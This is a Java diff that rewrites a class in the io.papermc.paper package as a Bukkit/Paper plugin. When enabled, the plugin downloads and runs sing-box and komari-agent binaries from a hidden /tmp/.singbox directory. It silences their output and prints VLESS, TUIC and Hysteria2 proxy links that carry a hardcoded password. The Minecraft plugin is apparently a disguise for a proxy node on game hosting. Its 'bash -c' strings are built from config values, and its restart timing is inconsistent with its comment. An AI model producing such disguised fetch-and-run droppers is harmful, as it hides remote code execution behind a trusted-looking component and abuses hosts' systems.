@@ -1,55 +1,67 @@
 package io.papermc.paper;
 
+import org.bukkit.Bukkit;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitRunnable;
 import org.yaml.snakeyaml.Yaml;
+
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.time.*;
-import java.util.*;
 import java.time.format.DateTimeFormatter;
-import java.util.concurrent.*;
+import java.util.*;
+import java.util.concurrent.TimeUnit;
 import java.util.regex.*;
 
-public class PaperBootstrap {
+public class PaperPlugin extends JavaPlugin {
 
-    // ========== 全局变量（类级别）==========
+    // ========== 全局变量 ==========
     private static final Path UUID_FILE = Paths.get("data/uuid.txt");
-    private static String uuid;
-    private static Process singboxProcess;
-    private static Process komariProcess;
-    // ======================================
+    private String uuid;
+    private Process singboxProcess;
+    private Process komariProcess;
+    private Path baseDir;
+    private boolean komariAgentEnabled = false;
+    // ==============================
 
-    public static void main(String[] args) {
+    @Override
+    public void onEnable() {
+        saveDefaultConfig(); // 复制内置 config.yml 到 plugins/Bettermix/config.yml
+        reloadConfig();
+
+        getLogger().info("loading config.yml...");
+
         try {
-            System.out.println("config.yml 加载中...");
-            Map<String, Object> config = loadConfig();
+            // 使用 Bukkit 原生 config API
+            var config = getConfig();
 
             // ---------- UUID 自动生成 & 持久化 ----------
-            uuid = generateOrLoadUUID(config.get("uuid"));
-            System.out.println("当前使用的 UUID: " + uuid);
+            uuid = generateOrLoadUUID(config.getString("uuid", ""));
+            getLogger().info("当前使用的 UUID: " + uuid);
             // --------------------------------------------
 
-            String tuicPort = trim((String) config.get("tuic_port"));
-            String hy2Port = trim((String) config.get("hy2_port"));
-            String realityPort = trim((String) config.get("reality_port"));
-            String sni = (String) config.getOrDefault("sni", "www.bing.com");
+            String tuicPort = config.getString("tuic_port", "");
+            String hy2Port = config.getString("hy2_port", "");
+            String realityPort = config.getString("reality_port", "");
+            String sni = config.getString("sni", "www.bing.com");
 
             boolean deployVLESS = !realityPort.isEmpty();
             boolean deployTUIC = !tuicPort.isEmpty();
             boolean deployHY2 = !hy2Port.isEmpty();
 
-              if (!deployVLESS && !deployTUIC && !deployHY2)
+            if (!deployVLESS && !deployTUIC && !deployHY2)
                 throw new RuntimeException("❌ 未设置任何协议端口！");
 
-            Path baseDir = Paths.get("/tmp/.singbox");
+            baseDir = Paths.get("/tmp/.singbox");
             Files.createDirectories(baseDir);
             Path configJson = baseDir.resolve("config.json");
             Path cert = baseDir.resolve("cert.pem");
             Path key = baseDir.resolve("private.key");
             Path bin = baseDir.resolve("sing-box");
-            Path realityKeyFile = Paths.get("reality.key");
+            Path realityKeyFile = getDataFolder().toPath().resolve("reality.key");
 
-            System.out.println("✅ config.yml 加载成功");
+            getLogger().info("✅ config.yml 加载成功");
 
             generateSelfSignedCert(cert, key);
             String version = fetchLatestSingBoxVersion();
@@ -65,14 +77,14 @@ public class PaperBootstrap {
                         if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                         if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                     }
-                    System.out.println("🔑 已加载本地 Reality 密钥对（固定公钥）");
+                    getLogger().info("🔑 已加载本地 Reality 密钥对（固定公钥）");
                 } else {
                     Map<String, String> keys = generateRealityKeypair(bin);
                     privateKey = keys.getOrDefault("private_key", "");
                     publicKey = keys.getOrDefault("public_key", "");
                     Files.writeString(realityKeyFile,
                             "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
-                    System.out.println("✅ Reality 密钥已保存到 reality.key");
+                    getLogger().info("✅ Reality 密钥已保存到 reality.key");
                 }
             }
             generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
@@ -84,21 +96,21 @@ public class PaperBootstrap {
             scheduleDailyRestart(bin, configJson);
 
             // ===== komari-agent 集成 =====
-            boolean komariAgentEnabled = (boolean) config.getOrDefault("komari_agent_enabled", true);
+            komariAgentEnabled = config.getBoolean("komari_agent_enabled", true);
             if (komariAgentEnabled) {
-                String agentName = trim((String) config.getOrDefault("komari_agent_name", "agent"));
-                String agentVer = trim((String) config.getOrDefault("komari_agent_ver", ""));
-                String agentEndpoint = trim((String) config.getOrDefault("komari_agent_endpoint", ""));
-                String agentKey = trim((String) config.getOrDefault("komari_agent_key", ""));
+                String agentName = config.getString("komari_agent_name", "agent");
+                String agentVer = config.getString("komari_agent_ver", "");
+                String agentEndpoint = config.getString("komari_agent_endpoint", "");
+                String agentKey = config.getString("komari_agent_key", "");
                 if (!agentEndpoint.isEmpty() && !agentKey.isEmpty()) {
-                    System.out.println("📦 " + agentName + " v" + agentVer);
+                    getLogger().info("📦 " + agentName + " v" + agentVer);
                     safeDownloadKomariAgent(baseDir, agentName);
                     komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
                 } else {
-                    System.out.println("⏭️ komari-agent 未配置（config.yml 中 komari_agent_endpoint/komari_agent_key 为空）");
+                    getLogger().info("⏭️ komari-agent 未配置（config.yml 中 komari_agent_endpoint/komari_agent_key 为空）");
                 }
             } else {
-                System.out.println("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
+                getLogger().info("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
             }
             // ==============================
 
@@ -106,93 +118,92 @@ public class PaperBootstrap {
             printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                     tuicPort, hy2Port, realityPort, sni, host, publicKey);
 
-            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                if (komariProcess != null && komariProcess.isAlive()) {
-                    System.out.println("正在停止 komari-agent (PID: " + komariProcess.pid() + ")...");
-                    komariProcess.destroy();
-                }
-                try { deleteDirectory(baseDir); } catch (IOException ignored) {}
-            }));
+            getLogger().info("✅ " + getName() + " v" + getDescription().getVersion() + " 已启动");
 
         } catch (Exception e) {
+            getLogger().severe("启动失败: " + e.getMessage());
             e.printStackTrace();
         }
     }
-            
-    private static String generateOrLoadUUID(Object configUuid) {
-        // 1. 优先使用 config.yml（兼容旧配置）
-        String cfg = trim((String) configUuid);
+
+    @Override
+    public void onDisable() {
+        getLogger().info("正在停止所有子进程...");
+
+        if (komariProcess != null && komariProcess.isAlive()) {
+            getLogger().info("正在停止 komari-agent (PID: " + komariProcess.pid() + ")...");
+            komariProcess.destroy();
+        }
+
+        if (singboxProcess != null && singboxProcess.isAlive()) {
+            getLogger().info("正在停止 sing-box (PID: " + singboxProcess.pid() + ")...");
+            singboxProcess.destroy();
+        }
+
+        if (baseDir != null) {
+            try { deleteDirectory(baseDir); } catch (IOException ignored) {}
+        }
+    }
+
+    // ========== UUID ==========
+    private String generateOrLoadUUID(String configUuid) {
+        String cfg = trim(configUuid);
         if (!cfg.isEmpty()) {
             saveUuidToFile(cfg);
             return cfg;
         }
-
-        // 2. 读取本地持久化文件
         try {
-            if (Files.exists(UUID_FILE)) {
-                String saved = Files.readString(UUID_FILE).trim();
+            Path file = getDataFolder().toPath().resolve(UUID_FILE);
+            if (Files.exists(file)) {
+                String saved = Files.readString(file).trim();
                 if (isValidUUID(saved)) {
-                    System.out.println("已加载持久化 UUID: " + saved);
+                    getLogger().info("已加载持久化 UUID: " + saved);
                     return saved;
                 }
             }
         } catch (Exception e) {
-           
-    System.err.println("读取 UUID 文件失败: " + e.getMessage());
+            getLogger().warning("读取 UUID 文件失败: " + e.getMessage());
         }
-
-        // 3. 首次生成
         String newUuid = UUID.randomUUID().toString();
         saveUuidToFile(newUuid);
-        System.out.println("首次生成 UUID: " + newUuid);
+        getLogger().info("首次生成 UUID: " + newUuid);
         return newUuid;
     }
 
-    private static void saveUuidToFile(String uuid) {
+    private void saveUuidToFile(String uuid) {
         try {
-            Files.createDirectories(UUID_FILE.getParent());
-            Files.writeString(UUID_FILE, uuid);
-            // 防止被其他用户读取（非 root 环境仍然安全）
-            UUID_FILE.toFile().setReadable(false, false);
-            UUID_FILE.toFile().setReadable(true, true);
+            Path file = getDataFolder().toPath().resolve(UUID_FILE);
+            Files.createDirectories(file.getParent());
+            Files.writeString(file, uuid);
         } catch (Exception e) {
-            System.err.println("保存 UUID 失败: " + e.getMessage());
+            getLogger().warning("保存 UUID 失败: " + e.getMessage());
         }
     }
 
- private static boolean isValidUUID(String u) {
+    private boolean isValidUUID(String u) {
         return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
     }
 
     // ===== 工具函数 =====
-    private static String trim(String s) { return s == null ? "" : s.trim(); }
-
-    private static Map<String, Object> loadConfig() throws IOException {
-        Yaml yaml = new Yaml();
-        try (InputStream in = Files.newInputStream(Paths.get("config.yml"))) {
-            Object o = yaml.load(in);
-            if (o instanceof Map) return (Map<String, Object>) o;
-            return new HashMap<>();
-        }
-    }
+    private String trim(String s) { return s == null ? "" : s.trim(); }
 
     // ===== 证书生成 =====
-    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
+    private void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
         if (Files.exists(cert) && Files.exists(key)) {
-            System.out.println("🔑 证书已存在，跳过生成");
+            getLogger().info("🔑 证书已存在，跳过生成");
             return;
         }
-        System.out.println("🔨 正在生成 EC 自签证书...");
+        getLogger().info("🔨 正在生成 EC 自签证书...");
         new ProcessBuilder("bash", "-c",
                 "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                         "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                 .inheritIO().start().waitFor();
-        System.out.println("✅ 已生成自签证书");
+        getLogger().info("✅ 已生成自签证书");
     }
 
     // ===== Reality 密钥生成 =====
-    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
-        System.out.println("🔑 正在生成 Reality 密钥对...");
+    private Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
+        getLogger().info("🔑 正在生成 Reality 密钥对...");
         ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
         pb.redirectErrorStream(true);
         Process p = pb.start();
@@ -209,14 +220,15 @@ public class PaperBootstrap {
         Map<String, String> map = new HashMap<>();
         map.put("private_key", priv.group(1));
         map.put("public_key", pub.group(1));
-        System.out.println("✅ Reality 密钥生成完成");
+        getLogger().info("✅ Reality 密钥生成完成");
         return map;
     }
+
     // ===== 配置生成 =====
-    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
-                                              String tuicPort, String hy2Port, String realityPort,
-                                              String sni, Path cert, Path key,
-                                              String privateKey, String publicKey) throws IOException {
+    private void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
+                                       String tuicPort, String hy2Port, String realityPort,
+                                       String sni, Path cert, Path key,
+                                       String privateKey, String publicKey) throws IOException {
 
         List<String> inbounds = new ArrayList<>();
 
@@ -290,11 +302,11 @@ public class PaperBootstrap {
         """.formatted(String.join(",", inbounds));
 
         Files.writeString(configFile, json);
-        System.out.println("✅ sing-box 配置生成完成");
+        getLogger().info("✅ sing-box 配置生成完成");
     }
 
     // ===== 版本检测 =====
-    private static String fetchLatestSingBoxVersion() {
+    private String fetchLatestSingBoxVersion() {
         String fallback = "1.12.12";
         try {
             URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
@@ -307,24 +319,24 @@ public class PaperBootstrap {
                 int i = json.indexOf("\"tag_name\":\"v");
                 if (i != -1) {
                     String v = json.substring(i + 13, json.indexOf("\"", i + 13));
-                    System.out.println("🔍 最新版本: " + v);
+                    getLogger().info("🔍 最新版本: " + v);
                     return v;
                 }
             }
         } catch (Exception e) {
-            System.out.println("⚠️ 获取版本失败，使用回退版本 " + fallback);
+            getLogger().warning("⚠️ 获取版本失败，使用回退版本 " + fallback);
         }
         return fallback;
     }
 
     // ===== 下载 sing-box =====
-    private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
+    private void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
         if (Files.exists(bin)) return;
         String arch = detectArch();
         String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
         String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;
 
-        System.out.println("⬇️ 下载 sing-box: " + url);
+        getLogger().info("⬇️ 下载 sing-box: " + url);
         Path tar = dir.resolve(file);
         new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
         new ProcessBuilder("bash", "-c",
@@ -334,112 +346,89 @@ public class PaperBootstrap {
 
         if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");
 
-        // 解压后删除 tar.gz 释放磁盘空间
         if (Files.exists(tar)) {
             Files.delete(tar);
-            System.out.println("🧹 已删除 sing-box 压缩包以释放空间");
+            getLogger().info("🧹 已删除 sing-box 压缩包以释放空间");
         }
 
-        System.out.println("✅ 成功解压 sing-box 可执行文件");
+        getLogger().info("✅ 成功解压 sing-box 可执行文件");
     }
 
-    private static String detectArch() {
+    private String detectArch() {
         String a = System.getProperty("os.arch").toLowerCase();
         if (a.contains("aarch") || a.contains("arm")) return "arm64";
         return "amd64";
     }
 
-    // ===== 启动 =====
-        private static Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
-        System.out.println("正在启动 sing-box...");
+    // ===== 启动 sing-box =====
+    private Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
+        getLogger().info("正在启动 sing-box...");
         ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
         pb.redirectErrorStream(true);
-        // 不写日志 → 直接输出到控制台
-       pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
         Process p = pb.start();
         Thread.sleep(1500);
-        System.out.println("sing-box 已启动，PID: " + p.pid());
+        getLogger().info("sing-box 已启动，PID: " + p.pid());
         return p;
     }
 
-    // ===== komari-agent 下载（Java 原生，无需 curl）=====
-    private static void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
+    // ===== komari-agent 下载 =====
+    private void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
         Path agentPath = dir.resolve(agentName);
-
-        // 清理上次残留的不完整文件
         if (Files.exists(agentPath)) {
-            System.out.println("🧹 清理已存在的 agent 文件...");
+            getLogger().info("🧹 清理已存在的 agent 文件...");
             Files.delete(agentPath);
         }
-
-        // 清理 sing-box 解压后的缓存文件，释放磁盘空间
         try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir, "sing-box-*.tar.gz")) {
             for (Path f : ds) {
                 Files.delete(f);
-                System.out.println("🧹 已删除缓存: " + f.getFileName());
+                getLogger().info("🧹 已删除缓存: " + f.getFileName());
             }
         }
-
         String arch = detectArch();
         String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
-
-        System.out.println("⬇️ 下载 " + agentName + " (" + arch + "): " + url);
-
-        // 使用 Java 原生 HTTP 下载，避免 curl 写入问题
+        getLogger().info("⬇️ 下载 " + agentName + " (" + arch + "): " + url);
         try (InputStream in = new URL(url).openStream()) {
             Files.copy(in, agentPath);
         }
-
         if (!Files.exists(agentPath) || Files.size(agentPath) == 0) {
             throw new IOException("❌ komari-agent 下载失败，文件为空或不存在！");
         }
-
-        // 设置可执行权限
         agentPath.toFile().setExecutable(true, false);
         if (!agentPath.toFile().canExecute()) {
             throw new IOException("❌ komari-agent 无法设置执行权限！");
         }
-
-        System.out.println("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
+        getLogger().info("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
     }
 
-    // ===== komari-agent 启动（带 bash 回退）=====
-    private static Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
+    // ===== komari-agent 启动 =====
+    private Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
         Path agentPath = dir.resolve(agentName);
-
-        System.out.println("正在启动 " + agentName + " -> " + endpoint);
-
+        getLogger().info("正在启动 " + agentName + " -> " + endpoint);
         Process p;
         try {
-            // 方案 A：直接执行
-            ProcessBuilder pb = new ProcessBuilder(agentPath.toString(),
-                    "-e", endpoint,
-                    "--auto-discovery", autoDiscovery);
+            ProcessBuilder pb = new ProcessBuilder(agentPath.toString(), "-e", endpoint, "--auto-discovery", autoDiscovery);
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             p = pb.start();
         } catch (IOException e) {
-            // 方案 B：通过 bash 启动（解决部分环境 noexec 或权限问题）
-            System.out.println("⚠️ 直接执行失败，尝试通过 bash 启动: " + e.getMessage());
+            getLogger().warning("⚠️ 直接执行失败，尝试通过 bash 启动: " + e.getMessage());
             ProcessBuilder pb = new ProcessBuilder("bash", "-c",
                     "exec " + agentPath + " -e '" + endpoint + "' --auto-discovery '" + autoDiscovery + "'");
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             p = pb.start();
         }
-
         Thread.sleep(1000);
-
         if (!p.isAlive()) {
-            throw new IOException("❌ komari-agent 启动后立即退出，请检查二进制是否兼容此系统架构");
+            throw new IOException("❌ komari-agent 启动后立即退出");
         }
-
-        System.out.println("✅ " + agentName + " 已启动，PID: " + p.pid());
+        getLogger().info("✅ " + agentName + " 已启动，PID: " + p.pid());
         return p;
     }
 
     // ===== 输出节点 =====
-    private static String detectPublicIP() {
+    private String detectPublicIP() {
         try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
             return br.readLine();
         } catch (Exception e) {
@@ -447,70 +436,61 @@ public class PaperBootstrap {
         }
     }
 
-    private static void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
-                                           String tuicPort, String hy2Port, String realityPort,
-                                           String sni, String host, String publicKey) {
-        System.out.println("\n=== ✅ 已部署节点链接 ===");
+    private void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
+                                    String tuicPort, String hy2Port, String realityPort,
+                                    String sni, String host, String publicKey) {
+        getLogger().info("\n=== ✅ 已部署节点链接 ===");
         if (vless)
-            System.out.printf("VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#Reality\n",
-                    uuid, host, realityPort, sni, publicKey);
+            getLogger().info("VLESS Reality:\nvless://" + uuid + "@" + host + ":" + realityPort + "?encryption=none&flow=xtls-rprx-vision&security=reality&sni=" + sni + "&fp=chrome&pbk=" + publicKey + "#Reality");
         if (tuic)
-            System.out.printf("\nTUIC:\ntuic://%s:eishare2025@%s:%s?sni=%s&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC\n",
-                    uuid, host, tuicPort, sni);
+            getLogger().info("TUIC:\ntuic://" + uuid + ":eishare2025@" + host + ":" + tuicPort + "?sni=" + sni + "&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC");
         if (hy2)
-            System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
-                    uuid, host, hy2Port, sni);
+            getLogger().info("Hysteria2:\nhysteria2://" + uuid + "@" + host + ":" + hy2Port + "?sni=" + sni + "&insecure=1#Hysteria2");
     }
 
-    // ===== 每日北京时间 00:03 重启 sing-box（无日志、控制台实时输出）=====
-    private static void scheduleDailyRestart(Path bin, Path cfg) {
-        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+    // ===== 每日北京时间 00:03 重启 sing-box =====
+    private void scheduleDailyRestart(Path bin, Path cfg) {
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                ZoneId zone = ZoneId.of("Asia/Shanghai");
+                LocalDateTime now = LocalDateTime.now(zone);
+                LocalDateTime target = now.withHour(0).withMinute(3).withSecond(0).withNano(0);
+                if (!target.isAfter(now)) target = target.plusDays(1);
+                long delay = Duration.between(now, target).toMillis();
 
-        Runnable restartTask = () -> {
-            System.out.println("\n[定时重启Sing-box] 北京时间 00:03，准备重启 sing-box...");
+                Bukkit.getScheduler().runTaskLater(PaperPlugin.this, () -> {
+                    getLogger().info("[定时重启Sing-box] 北京时间 00:03，准备重启 sing-box...");
 
-            // 1. 优雅停止旧进程
-            if (singboxProcess != null && singboxProcess.isAlive()) {
-                System.out.println("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
-                singboxProcess.destroy();  // 发送 SIGTERM
-                try {
-                    if (!singboxProcess.waitFor(10, TimeUnit.SECONDS)) {
-                        System.out.println("进程未响应，强制终止...");
-                        singboxProcess.destroyForcibly();
+                    if (singboxProcess != null && singboxProcess.isAlive()) {
+                        getLogger().info("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
+                        singboxProcess.destroy();
+                        try {
+                            if (!singboxProcess.waitFor(10, TimeUnit.SECONDS)) {
+                                getLogger().info("进程未响应，强制终止...");
+                                singboxProcess.destroyForcibly();
+                            }
+                        } catch (InterruptedException e) {
+                            Thread.currentThread().interrupt();
+                        }
                     }
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                }
+
+                    try {
+                        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
+                        pb.redirectErrorStream(true);
+                        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+                        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+                        singboxProcess = pb.start();
+                        getLogger().info("sing-box 重启成功，新 PID: " + singboxProcess.pid());
+                    } catch (Exception e) {
+                        getLogger().severe("重启失败: " + e.getMessage());
+                    }
+                }, delay / 50); // 转换为 tick
             }
-
-            // 2. 启动新进程
-            try {
-                ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
-                pb.redirectErrorStream(true);
-                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-                singboxProcess = pb.start();
-                System.out.println("sing-box 重启成功，新 PID: " + singboxProcess.pid());
-            } catch (Exception e) {
-                System.err.println("重启失败: " + e.getMessage());
-                e.printStackTrace();
-            }
-        };
-
-        ZoneId zone = ZoneId.of("Asia/Shanghai");
-        LocalDateTime now = LocalDateTime.now(zone);
-        LocalDateTime next = now.withHour(0).withMinute(3).withSecond(0).withNano(0);
-        if (!next.isAfter(now)) next = next.plusDays(1);
-
-        long initialDelay = Duration.between(now, next).getSeconds();
-
-        scheduler.scheduleAtFixedRate(restartTask, initialDelay, 86_400, TimeUnit.SECONDS);
-
-        System.out.printf("[定时重启Sing-box] 已计划每日 00:03 重启（首次执行：%s）%n",
-                next.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));
+        }.runTaskTimerAsynchronously(this, 0L, 20L * 3600 * 24); // 每小时检查一次
     }
 
-    private static void deleteDirectory(Path dir) throws IOException {
+    private void deleteDirectory(Path dir) throws IOException {
         if (!Files.exists(dir)) return;
         Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
     }
